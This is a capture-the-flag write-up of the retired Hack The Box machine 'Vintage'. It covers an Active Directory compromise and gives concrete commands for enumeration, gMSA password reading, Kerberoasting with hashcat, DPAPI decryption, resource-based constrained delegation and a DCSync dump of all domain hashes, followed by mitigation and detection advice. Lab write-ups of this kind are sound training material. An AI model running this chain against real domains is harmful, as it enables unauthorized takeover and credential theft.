---
machine: Vintage
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, ad, gmsa, kerberoast, dpapi, rbcd, dcsync]
---

# Vintage — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A valid initial password for `P.Rosa` enables AD enumeration. The `FS01$` computer account keeps the Pre-Windows 2000 default password and is used to read the `gMSA01$` GMSA. A targeted Kerberoast against `svc_sql` yields a weak password; it decrypts an administrative account's DPAPI credentials. RBCD with `FS01$` leads to DCSync.

## Recon

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,3268,3269,5985 <IP>
```

- `53/88/389/445/636` identify a `vintage.htb` DC.
- `5985/tcp` WinRM is open and so is `139/tcp` SMB.
- The domain only accepts Kerberos for initial authentication.

## Enumeration

- `P.Rosa` has a valid initial password; `bloodhound-python` maps groups and ACLs.
- `FS01$` appears in “Pre-Windows 2000 Compatible Access” and its password is the computer name without `$`.
- `gMSA01$` can be read from that account; `svc_sql` has an SPN and is a Kerberoast target.

## Foothold

Use `P.Rosa` to enumerate and `FS01$` to read `gMSA01$`'s password. Request a TGS for `svc_sql` with `GetUserSPNs.py` and crack it with `hashcat -m 13100`; the resulting account can access an administrative user's files.

```bash
bloodhound-python -u P.Rosa -p '<INITIAL_PASSWORD>' -d vintage.htb -ns <IP> -c All
certipy-ad account read -u 'FS01$' -p '<MACHINE_PASSWORD>' -dc-ip <IP> -target dc.vintage.htb
GetUserSPNs.py vintage.htb/P.Rosa:'<INITIAL_PASSWORD>' -dc-ip <IP> -request
hashcat -m 13100 tgs.txt rockyou.txt
```

## Lateral movement

With `svc_sql`, read `c.neri_adm`'s DPAPI blobs from the profile and decrypt them with `dpapi.py`. That administrative credential enables RBCD: write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC and use `FS01$` to request an S4U2self/S4U2Proxy ticket.

## Privilege escalation

Configure RBCD on the DC for `FS01$`, request a ticket as `administrator` and run `secretsdump.py` with `-just-dc` for DCSync. This yields every domain hash and the root flag.

```bash
rbcd.py -delegate-from 'FS01$' -delegate-to 'DC$' -action write -dc-ip <IP> vintage.htb/c.neri_adm:'<PASSWORD>'
getST.py -spn cifs/dc.vintage.htb -impersonate administrator -dc-ip <IP> vintage.htb/'FS01$':'<MACHINE_PASSWORD>'
secretsdump.py -k -no-pass dc.vintage.htb -just-dc
```

## Evidence

- AD enumeration with `P.Rosa` and `gMSA01$` read.
- Cracked `svc_sql` TGS and decrypted DPAPI blobs.
- RBCD configured and DCSync completed.

## Lessons learned

- Legacy computer accounts may keep predictable passwords.
- A misdelegated GMSA and a weak SPN password open the domain.
- RBCD and DPAPI are common chains to DCSync.

## Mitigation and detection

- Rotate computer account passwords and remove Pre-Windows 2000 inheritance.
- Use managed passwords and review who can read GMSAs.
- Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` and S4U2Proxy requests.

## References

- [0xdf — Vintage](https://0xdf.gitlab.io/2025/04/26/htb-vintage.html)
- [IppSec — Vintage](https://www.youtube.com/watch?v=-JM--KfVhpA)
- [Hack The Box — Vintage](https://app.hackthebox.com/machines/vintage)
